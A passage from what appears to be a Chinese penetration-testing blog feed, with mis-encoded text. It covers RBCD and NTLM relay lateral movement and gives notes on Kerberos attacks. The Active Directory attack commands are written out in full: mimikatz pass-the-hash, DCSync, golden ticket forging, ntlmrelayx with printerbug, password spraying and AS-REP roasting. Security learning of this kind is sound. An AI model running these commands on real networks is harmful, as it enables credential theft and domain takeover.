ä¸€ä¸ªç”¨æˆ·ï¼Œæˆ‘è¿™é‡Œå°±æŠŠåˆšåˆšçš„RBCDhackerç”¨æˆ·åŠ å…¥åˆ°AOç»„å†…äº†ã€‚</p><p><img src="../ç¬”è®°å›¾/image-20240907143642407.png" alt="image-20240907143642407"></p><p>Acount Operatorsç»„æˆå‘˜å¯ä»¥ä¿®æ”¹åŸŸå†…é™¤äº†åŸŸæ§å…¶ä»–æ‰€æœ‰ä¸»æœºçš„<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§ï¼Œæ‰€ä»¥æ­¥éª¤å°±å’Œä¸Šé¢çš„ä¸€æ ·äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 192.168.139.160:389 -s subtree -b CN=<span class="string">&quot;Account Operators&quot;</span>,CN=Builtin,DC=chu0,DC=time member</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907143713155.png" alt="image-20240907143713155"></p><p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°æ­¤ç»„å†…æœ‰ä¸€åä¸ºRBCDhackerçš„ç”¨æˆ·ä¸”è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å°†åˆšåˆšè®¾ç½®çš„WIN-E5O87N3AMQIæœºå™¨çš„msDS-AllowedToActOnBehalfOfOtherIdentityæ¸…é™¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1;Set-DomainObject WIN-E5O87N3AMQI -Clear <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose</span><br></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥çœ‹åå·²ç»ä¸ºç©º</p><p><img src="../ç¬”è®°å›¾/image-20240907144629171.png" alt="image-20240907144629171"></p><p>åé¢çš„å°±ä¸åšè¿‡å¤šèµ˜è¿°äº†ï¼Œå’Œç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ä¸€æ ·ï¼Œä¿®æ”¹ç›®æ ‡æœºå™¨çš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ç„¶åç”³è¯·ç¥¨æ®æ— å¯†ç è¿æ¥å³å¯</p><p>è¡¥å……ä¸€ä¸‹å¦‚ä½•æŸ¥çœ‹ç”¨æˆ·æƒé™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"><span class="comment"># è·å– RBCDhacker ç”¨æˆ·çš„ SID</span></span><br><span class="line">Get-DomainUser -Identity RBCDhacker -Properties objectsid</span><br><span class="line"><span class="comment"># æšä¸¾ RBCDhacker ç”¨æˆ·å¯¹ WIN-E5O87N3AMQI çš„ ACE</span></span><br><span class="line">Get-DomainObjectAcl -Identity WIN-E5O87N3AMQI | ?&#123;<span class="variable">$_</span>.SecurityIdentifier -match <span class="string">&quot;S-1-5-21-1075071014-1600225418-2883514341-1108&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="NTLMé‡æ”¾æ¨ªå‘"><a href="#NTLMé‡æ”¾æ¨ªå‘" class="headerlink" title="NTLMé‡æ”¾æ¨ªå‘"></a>NTLMé‡æ”¾æ¨ªå‘</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>èƒ½åˆ›å»ºæœºå™¨è´¦æˆ·ï¼ˆMAQä¸ä¸º0ï¼‰</li><li>å¯ä»¥åˆ©ç”¨å¼ºåˆ¶è®¿é—®æ¼æ´</li><li>ä¸€åŸŸå†…ç”¨æˆ·å¯†ç ï¼ˆæ ¹æ®å¼ºåˆ¶æ¼æ´å†³å®šï¼‰</li></ul><p>å…ˆåœ¨kaliå¼€å¯ç›‘å¬ï¼Œç­‰å¾…è®¿é—®ï¼Œå¼ºåˆ¶è®¿é—®åä¼šç›´æ¥ä¿®æ”¹ç›®æ ‡æœºå™¨çš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ä¸ºhackerè´¦æˆ·ï¼Œå¯ä»¥å‚è€ƒäº‘å¢ƒSpoofing</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap://192.168.139.160 -smb2support --remove-mic --delegate-access --escalate-user hacker\$</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ‰“å°æœºæ¼æ´å¼ºåˆ¶è®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ©ç”¨æ‰“å°æœºæ¼æ´å›è¿</span></span><br><span class="line">python3 printerbug.py chu0.time/RBCDhacker:<span class="built_in">whoami</span>\@666@192.168.139.161 192.168.139.160</span><br></pre></td></tr></table></figure><p>ç„¶åç”³è¯·ç¥¨æ®ï¼Œå¯¼å…¥ï¼Œæ— å¯†ç è¿æ¥å³å¯</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Kerberosåè®®ã®å°è®°</title>
    <link href="https://bowuchuling.github.io/posts/Kerberos.html"/>
    <id>https://bowuchuling.github.io/posts/Kerberos.html</id>
    <published>2024-08-24T11:39:11.507Z</published>
    <updated>2024-08-24T11:43:39.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Kerberosåè®®ã®å°è®°"><a href="#Kerberosåè®®ã®å°è®°" class="headerlink" title="Kerberosåè®®ã®å°è®°"></a>Kerberosåè®®ã®å°è®°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨åŸŸæ¸—é€é¢†åŸŸä¸­ï¼ŒKerberos åè®®è®¤è¯å ªç§°æ˜¯å®Œå…¨æ— æ³•å›é¿çš„å…³é”®ç¯èŠ‚ï¼Œå‡ ä¹æ‰€æœ‰çš„åŸŸæ”»å‡»å‡ä¸æ­¤åè®®ç´§å¯†ç›¸è¿ã€‚æ­£å› å¦‚æ­¤ï¼Œç‰¹æ„æ’°å†™æ­¤æ–‡ï¼Œæ—¨åœ¨åŠ©åŠ›å°ç™½è¿…é€Ÿæ´æ‚‰åŸŸç¯å¢ƒä¸­çš„ Kerberos åè®®ã€‚ä»¥ä¸‹çš„è®²è§£ä»…ä»£è¡¨ä¸ªäººè§è§£ï¼Œè‹¥å­˜åœ¨é”™è¯¯ä¹‹å¤„ï¼Œè¿˜æœ›å¸ˆå‚…ä»¬èƒ½å¤Ÿä¸åæŒ‡æ­£ã€‚çƒçƒï¼š2161992897</p><h2 id="ä»€ä¹ˆæ˜¯Kerberosï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Kerberosï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Kerberosï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Kerberosï¼Ÿ</h2><p>kerberosæ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œè®¤è¯åè®®ï¼Œä»–èƒ½å¤Ÿä¸ºç½‘ç»œä¸­é€šä¿¡çš„åŒæ–¹æä¾›ä¸¥æ ¼çš„èº«ä»½éªŒè¯æœåŠ¡ï¼Œç¡®ä¿é€šä¿¡åŒæ–¹èº«ä»½çš„çœŸå®æ€§å’Œå®‰å…¨æ€§ã€‚</p><h2 id="è®¤è¯è¿‡ç¨‹åˆ†æ"><a href="#è®¤è¯è¿‡ç¨‹åˆ†æ" class="headerlink" title="è®¤è¯è¿‡ç¨‹åˆ†æ"></a>è®¤è¯è¿‡ç¨‹åˆ†æ</h2><h3 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h3><p>è¿™é‡Œå…ˆæ”¾ä¸¤å¼ æµç¨‹å›¾ï¼Œä¸‹é¢ä¾æ¬¡ç®€ç§°å›¾ä¸€ã€å›¾äºŒã€‚</p><p><img src="../ç¬”è®°å›¾/image-20240824154216968.png" alt="image-20240824154216968"></p><p><img src="../ç¬”è®°å›¾/image-20240824160747023.png" alt="image-20240824160747023"></p><h3 id="æ¦‚å¿µè§£æ"><a href="#æ¦‚å¿µè§£æ" class="headerlink" title="æ¦‚å¿µè§£æ"></a>æ¦‚å¿µè§£æ</h3><ol><li>Clientï¼šå®¢æˆ·ç«¯ï¼ˆå‘é€è¯·æ±‚çš„æœºå™¨ï¼‰</li><li>Serverï¼šæœåŠ¡ç«¯ï¼ˆè¢«è¯·æ±‚çš„æœåŠ¡ï¼‰</li><li>KDCï¼šå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKey Distribution Centerï¼‰ï¼Œç”±ASå’ŒTGSç»„æˆ</li><li>ASï¼šè®¤è¯æœåŠ¡å™¨ï¼ˆAuthentication Serviceï¼‰ä¸“é—¨ç”¨æ¥è®¤è¯å®¢æˆ·ç«¯çš„èº«ä»½å¹¶å‘æ”¾å®¢æˆ·ç”¨äºè®¿é—®TGSçš„TGT</li><li>TGSï¼šç¥¨æ®æˆäºˆæœåŠ¡å™¨ï¼ˆTicket Granting Serviceï¼‰ï¼Œç”¨æ¥å‘æ”¾æ•´ä¸ªè®¤è¯è¿‡ç¨‹ä»¥åŠå®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯æ—¶æ‰€éœ€çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆSTï¼‰</li><li>ADï¼šè´¦æˆ·æ•°æ®åº“ï¼ˆAccount Databaseï¼‰ï¼Œå­˜å‚¨æ‰€æœ‰Clientçš„ç™½åå•</li></ol><h3 id="è¿‡ç¨‹åˆ†æ"><a href="#è¿‡ç¨‹åˆ†æ" class="headerlink" title="è¿‡ç¨‹åˆ†æ"></a>è¿‡ç¨‹åˆ†æ</h3><p>ä»å›¾ä¸€ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒKerberosåè®®å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªè¿‡ç¨‹</p><ul><li>èº«ä»½éªŒè¯æœåŠ¡ (AS) äº¤æ¢ (KRB<em>AS</em>*ï¼‰</li><li>ç¥¨è¯æˆäºˆæœåŠ¡ (TGS) äº¤æ¢ (KRB<em>TGS</em>*ï¼‰</li><li>å®¢æˆ·ç«¯/æœåŠ¡å™¨ (AP) äº¤æ¢ (KRB<em>AP</em>*ï¼‰</li></ul><p>è€Œå…¶ä¸­çš„*ä¾¿ä»£è¡¨ç€REQï¼ˆrequestè¯·æ±‚ï¼‰å’ŒREPï¼ˆresponseå“åº”ï¼‰ä¸¤éƒ¨åˆ†ï¼Œæ€»ä½“è¯·æ±‚è¿‡ç¨‹å¦‚ä¸‹ï¼ˆç»“åˆå›¾äºŒçœ‹ï¼‰</p><h4 id="KRBAS"><a href="#KRBAS" class="headerlink" title="KRBAS*"></a>KRB<em>AS</em>*</h4><p><img src="../ç¬”è®°å›¾/image-20240824171013130.png" alt="image-20240824171013130"></p><p><strong>KRB_AS_REQ</strong></p><ol><li>å®¢æˆ·ç«¯å‘KDCä¸­çš„ASå‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚ä¸­æºå¸¦äº†è‡ªå·±çš„<strong>ç”¨æˆ·å</strong>ã€ä¸»æœºIPå’Œ<strong>å½“å‰æ—¶é—´æˆ³</strong></li><li>ASæ”¶åˆ°è¯·æ±‚ä¹‹åä¼šå‘ADæŸ¥è¯¢è¯·æ±‚çš„ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œæ­¤æ—¶åªä¼šæŸ¥æ‰¾æ˜¯å¦æœ‰ç›¸åŒç”¨æˆ·åçš„ç”¨æˆ·ï¼Œå¹¶ä¸ä¼šåˆ¤æ–­èº«ä»½çš„å¯é æ€§</li><li>å¦‚æœæ²¡æœ‰è¯¥ç”¨æˆ·åï¼Œåˆ™è®¤è¯å¤±è´¥ã€‚å¦‚æœå­˜åœ¨è¯¥ç”¨æˆ·åï¼Œåˆ™ä¼šè¿›è¡Œä¸‹ä¸€æ­¥çš„AS_REP</li></ol><p><strong>KRB_AS_REP</strong></p><p>å½“AS_REQåœ¨KDCè®¤è¯æˆåŠŸåï¼Œä¼šç»™Clientè¿”å›ä¸¤éƒ¨åˆ†å†…å®¹</p><ol><li>TGTï¼ˆTicket Granting Ticketï¼‰ï¼Œå®ƒæ˜¯ç”±ASè®¤è¯æœåŠ¡å™¨é¢å‘ï¼Œå…¶åŒ…å«è¯¥å®¢æˆ·ç«¯çš„<strong>Name</strong>ã€IPã€<strong>å½“å‰æ—¶é—´æˆ³</strong>ã€<strong>å®¢æˆ·ç«¯å³å°†è®¿é—®çš„TGSçš„Name</strong>ã€<strong>TGTçš„æœ‰æ•ˆæ—¶é—´</strong>ä»¥åŠä¸€ä¸ªç”¨<strong>CT_SK</strong></li><li>Session Keyï¼Œæ­¤å†…å®¹ç”±å®¢æˆ·ç«¯çš„å“ˆå¸ŒåŠ å¯†</li></ol><p>åœ¨KRB<em>AS</em>*è¿‡ç¨‹é‡ç‚¹éœ€è¦äº†è§£çš„å°±æ˜¯é€šè¿‡ASè¯·æ±‚æˆ‘ä»¬å¯ä»¥è·å¾—TGTã€‚</p><h4 id="KRBTGS"><a href="#KRBTGS" class="headerlink" title="KRBTGS*"></a>KRB<em>TGS</em>*</h4><p>å®¢æˆ·ç«¯åˆ©ç”¨åœ¨AS_REPä¸­æ‹¿åˆ°çš„ä¿¡æ¯å‘KDCä¸­çš„TGSå‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚çš„ç›®çš„æ˜¯ä¸ºäº†è·å–èƒ½å¤Ÿè®¿é—®ç›®æ ‡ç½‘ç»œæœåŠ¡çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆServer Ticketï¼Œå³STï¼‰</p><p><img src="../ç¬”è®°å›¾/image-20240824172240093.png" alt="image-20240824172240093"></p><p><strong>KRB_TGS_REQ</strong></p><ol><li>å®¢æˆ·ç«¯ä½¿ç”¨CT_SKåŠ å¯†å°†è‡ªå·±çš„å®¢æˆ·ç«¯ä¿¡æ¯å‘é€ç»™KDCï¼Œå…¶ä¸­åŒ…æ‹¬<strong>å®¢æˆ·ç«¯å</strong>ã€IPã€<strong>æ—¶é—´æˆ³</strong></li><li>å®¢æˆ·ç«¯å°†è‡ªå·±æƒ³è¦è®¿é—®çš„ServeræœåŠ¡ä»¥æ˜æ–‡çš„æ–¹å¼å‘é€ç»™KDC</li><li>å®¢æˆ·ç«¯å°†ä½¿ç”¨TGSå¯†é’¥åŠ å¯†çš„TGTä¹ŸåŸå°ä¸åŠ¨çš„ä¹Ÿæºå¸¦ç»™KDC</li></ol><p><strong>KRB_TGS_REP</strong></p><p>KDCä¸­çš„TGSä¼šæ ¹æ®è¯·æ±‚ä¸­çš„ä¿¡æ¯æ£€æŸ¥æ—¶é—´æ˜¯å¦è¶…æ—¶ã€è¯·æ±‚çš„æœåŠ¡æ˜¯å¦å­˜åœ¨ä»¥åŠç”¨äºè¯·æ±‚çš„ç”¨æˆ·æ˜¯å¦åˆæ³•ï¼Œå¦‚æœæ¡ä»¶éƒ½ç¬¦åˆåˆ™ä¼šè¿”å›ä¸¤éƒ¨åˆ†æ•°æ®ã€‚</p><ol><li>ST(Server Ticket)ï¼Œå…¶ä¸­åŒ…æ‹¬å®¢æˆ·ç«¯çš„<strong>Name</strong>ï¼ŒIPï¼Œéœ€è¦è®¿é—®çš„ç½‘ç»œæœåŠ¡çš„åœ°å€<strong>Server IP</strong>ï¼ŒSTçš„æœ‰æ•ˆæ—¶é—´ï¼Œ<strong>æ—¶é—´æˆ³</strong>ä»¥åŠç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„<strong>CS_SK</strong></li><li>ä½¿ç”¨CT_SKåŠ å¯†çš„å†…å®¹ï¼Œå…¶ä¸­åŒ…æ‹¬<strong>CS_SK</strong>å’Œ<strong>æ—¶é—´æˆ³</strong>ï¼Œè¿˜æœ‰<strong>STçš„æœ‰æ•ˆæ—¶é—´</strong></li></ol><p>åœ¨KRB<em>TGS</em>*è¿‡ç¨‹é‡ç‚¹éœ€è¦äº†è§£çš„å°±æ˜¯é€šè¿‡TGSè¯·æ±‚æˆ‘ä»¬å¯ä»¥è·å¾—STã€‚</p><h4 id="KRBAP"><a href="#KRBAP" class="headerlink" title="KRBAP*"></a>KRB<em>AP</em>*</h4><p>åœ¨åŸŸæ¸—é€å½“ä¸­ï¼Œä¸æœåŠ¡ç«¯çš„é€šè®¯ä»¥åŠä¸æ¶‰åŠä»€ä¹ˆå¤æ‚çš„èº«ä»½è®¤è¯è¿‡ç¨‹äº†ï¼Œåªéœ€è¦æ‹¿ç€åœ¨å‰é¢è¿‡ç¨‹ä¸­ä¼ªé€ æˆ–è€…è·å–çš„ç¥¨æ®æ¥è®¿é—®å¯¹åº”çš„æœåŠ¡å³å¯ã€‚</p><h2 id="Kerberosåè®®åˆ©ç”¨"><a href="#Kerberosåè®®åˆ©ç”¨" class="headerlink" title="Kerberosåè®®åˆ©ç”¨"></a>Kerberosåè®®åˆ©ç”¨</h2><h3 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h3><h4 id="å“ˆå¸Œä¼ é€’"><a href="#å“ˆå¸Œä¼ é€’" class="headerlink" title="å“ˆå¸Œä¼ é€’"></a>å“ˆå¸Œä¼ é€’</h4><p>è¿™é‡Œä¼ é€’çš„å“ˆå¸ŒæŒ‡çš„å…¶å®å°±æ˜¯NTLMï¼Œè€Œæåˆ°NTLMå°±é¡ºé“æä¸€å˜´æˆ‘ä»¬åœ¨åŸŸç¯å¢ƒä¸­æŠ“å–çš„HTLMæ˜¯æ€ä¹ˆæ¥çš„å§ã€‚</p><h5 id="NTLMç®€ä»‹"><a href="#NTLMç®€ä»‹" class="headerlink" title="NTLMç®€ä»‹"></a>NTLMç®€ä»‹</h5><p>åœ¨windowsç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬çš„å¯†ç éƒ½æ˜¯å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%systemroot%\system32\config\sam</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240824175408524.png" alt="image-20240824175408524"></p><p>samä¸­å­˜å‚¨çš„å°±æ˜¯NTLMå“ˆå¸Œå€¼ï¼Œå½“ç”¨æˆ·ç™»å½•çš„æ—¶å€™ä¼šè°ƒç”¨å“åº”è¿›ç¨‹å°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡çš„HTLMå“ˆå¸Œå€¼ä¸samä¸­çš„å€¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœå¯¹æ¯”æˆåŠŸåˆ™å¯ä»¥æˆåŠŸç™»å½•</p><h5 id="NTLMå¦‚ä½•è·å–ï¼Ÿ"><a href="#NTLMå¦‚ä½•è·å–ï¼Ÿ" class="headerlink" title="NTLMå¦‚ä½•è·å–ï¼Ÿ"></a>NTLMå¦‚ä½•è·å–ï¼Ÿ</h5><p>åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨mimikatzæˆ–è€…MSFçš„hashdumpç­‰æ“ä½œæ¥è·å–å¯¹åº”ç”¨æˆ·çš„HTLMå“ˆå¸Œå€¼ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨pythonæ¥è°ƒç”¨NTLMå“ˆå¸Œç®—æ³•æ¥è·å–å¯¹åº”çš„å“ˆå¸Œå€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> passlib.<span class="built_in">hash</span> <span class="keyword">import</span> nthash</span><br><span class="line"></span><br><span class="line">h = nthash.<span class="built_in">hash</span>(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="comment">#209c6174da490caeb422f3fa5a7ae634</span></span><br></pre></td></tr></table></figure><p>å…·ä½“ç®—æ³•å¦‚ä¸‹</p><p><img src="../ç¬”è®°å›¾/image-20240824180647769.png" alt="image-20240824180647769"></p><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p>åœ¨æ¸—é€è¿‡ç¨‹ä¸­å¯ä»¥æ ¹æ®å¯¹æ–¹æœºå™¨æ‰€å¼€æœºå™¨çš„æœåŠ¡æ¥ä½¿ç”¨ä¸é€šçš„æœåŠ¡è¿›è¡ŒPTHæ”»å‡»ï¼Œæ¯”å¦‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨mimikatzè¿›è¡ŒPTH</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:user /domain:domain /ntlm:hash&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨impacketè„šæœ¬è¿›è¡ŒPTH**</span></span><br><span class="line">python3 xxx.py domain/user@ip -hashes :93b95aef15f4d50fab96ffc44a2f326a</span><br></pre></td></tr></table></figure><h4 id="åŸŸå†…ç”¨æˆ·æšä¸¾"><a href="#åŸŸå†…ç”¨æˆ·æšä¸¾" class="headerlink" title="åŸŸå†…ç”¨æˆ·æšä¸¾"></a>åŸŸå†…ç”¨æˆ·æšä¸¾</h4><p>åœ¨AS-REQé˜¶æ®µï¼Œè¯·æ±‚ä¸­ä¼šæºå¸¦cnameå€¼ï¼Œæˆ‘ä»¬å¯ä»¥å‘åŸŸæ§å‘èµ·å¯¹åº”è¯·æ±‚ï¼ŒåŸŸæ§ä¼šæ ¹æ®ç”¨æˆ·çš„çœŸå®çŠ¶æ€è¿”å›ç›¸åº”çš„ç”¨æˆ·çŠ¶æ€ã€‚æ‰€ä»¥å½“ä½ æ‹¿åˆ°ä¸€å †ç”¨æˆ·åçš„æ—¶å€™ï¼Œå¯ä»¥å…ˆè¿›è¡Œä¸€æ³¢æšä¸¾ï¼Œå¦‚æœéƒ½æ‰¾å‡ºçœŸå®å­˜åœ¨çš„åŸŸç”¨æˆ·ï¼Œå†è¿›è¡Œç›¸åº”çš„åŸŸæ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 EnumADUser.py 192.168.200.143 0day.org user.txt tcp</span><br></pre></td></tr></table></figure><h4 id="å¯†ç å–·æ´’"><a href="#å¯†ç å–·æ´’" class="headerlink" title="å¯†ç å–·æ´’"></a>å¯†ç å–·æ´’</h4><p>å’ŒåŸŸç”¨æˆ·æšä¸¾çš„æ€è·¯å¤§è‡´ç›¸åŒï¼Œæ‹¿åˆ°ä¸€å †è´¦å·å¯†ç ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨ç›¸åº”çš„å·¥å…·å¯¹äºä¸»æœºè¿›è¡Œçˆ†ç ´å¤„ç†ï¼Œæ ¹æ®è¿”å›çŠ¶æ€çš„ä¸é€šåˆ¤æ–­æ­¤è´¦å·å¯†ç æ˜¯å¦ä¸å¯¹åº”çš„ä¸»æœºç›¸åŒ¹é…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.4.45 -u username -p passwd -d domain 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h3><h4 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h4><p>é€šå¸¸æ˜¯åœ¨æ‹¿ä¸‹åŸŸç®¡ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡mimikatzç­‰æ“ä½œæ‹¿åˆ°krbtgtçš„å“ˆå¸Œå€¼ï¼Œå†é€šè¿‡å…¶ä»–ç»„æˆç¥¨æ®çš„å‚æ•°ä¼ªé€ ç¥¨æ®</p><h5 id="è·å–æ‰€éœ€å‚æ•°"><a href="#è·å–æ‰€éœ€å‚æ•°" class="headerlink" title="è·å–æ‰€éœ€å‚æ•°"></a>è·å–æ‰€éœ€å‚æ•°</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:0day.org /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š </p><ul><li><p>sidï¼šS-1-5-21-1812960810-2335050734-3517558805 </p></li><li><p>ntlm hashï¼š36f9d9e6d98ecf8307baf4f46ef842a2 </p></li><li><p>aes256ï¼šdbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9</p></li></ul><h5 id="ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ-aes256"><a href="#ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ-aes256" class="headerlink" title="ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ(aes256)"></a>ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ(aes256)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /user:administrator/ticket:gold.kirbi&quot;</span></span><br></pre></td></tr></table></figure><h5 id="ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ-krbtgt-hash"><a href="#ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ-krbtgt-hash" class="headerlink" title="ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ(krbtgt hash)"></a>ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ(krbtgt hash)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /user:administrator /ticket:gold.kirbi</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆæ–‡ä»¶gold.kirbi</p><p>å¯¼å…¥Golden Ticketï¼Œè¿›è¡ŒPTT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\jack.0DAY\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure><h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h4><p>å½“åŸŸæ§å…³é—­äº†é¢„èº«ä»½éªŒè¯åï¼Œæˆ‘ä»¬å¯ä»¥å‘åŸŸæ§çš„88ç«¯å£å‘èµ·è¯·æ±‚ï¼Œæ­¤æ—¶åŸŸæ§ä¸ä¼šè¿›è¡Œä»»ä½•éªŒè¯å°±å°†TGTå’Œè¯¥ç”¨æˆ·HashåŠ å¯†çš„Login Session Key è¿”å›ï¼Œå¯¹æ”¶åˆ°çš„AS-REPå†…å®¹é‡æ–°ç»„åˆï¼Œèƒ½å¤Ÿæ‹¼æ¥æˆâ€Kerberos 5 AS-REP etype 23â€(18200)çš„æ ¼å¼ï¼Œæ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨hashcatæˆ–æ˜¯johnå¯¹å…¶ç ´è§£ï¼Œæœ€ç»ˆè·å¾—è¯¥ç”¨æˆ·çš„æ˜æ–‡å£ä»¤</p><p>ä½¿ç”¨impacketä¸­çš„<code>GetNPUsers.py</code>æ¥è¿›è¡Œæ£€ç´¢å“ªäº›ç”¨æˆ·å¼€å¯äº†â€œDo not require Kerberos preauthenticationâ€ï¼Œå¹¶è·å–ä»–ä»¬çš„TGTï¼Œä»¥hashcatèƒ½çˆ†ç ´çš„å½¢å¼è¾“å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 